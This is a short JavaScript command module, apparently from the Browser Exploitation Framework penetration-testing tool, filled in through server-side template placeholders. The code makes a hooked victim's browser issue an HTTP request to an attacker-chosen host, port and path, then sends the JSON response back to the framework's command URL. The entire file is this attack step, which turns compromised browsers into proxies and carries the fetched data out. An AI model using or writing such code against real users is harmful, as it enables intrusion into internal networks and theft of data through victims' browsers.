//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var scheme = "<%= @scheme %>";
	var method = "<%= @method %>";
	var domain = "<%= @domain %>";
	var port = "<%= @port %>";
	var path = "<%= @path %>";
	var anchor = "<%= @anchor %>";
	var data = "<%= @data %>";
	var timeout = "<%= @timeout %>";
	var dataType = "<%= @dataType %>";

	server.net.request(scheme, method, domain, port, path, anchor, data, timeout, dataType, function(response) { server.net.send("<%= @command_url %>", <%= @command_id %>, JSON.stringify(response)); } );

});

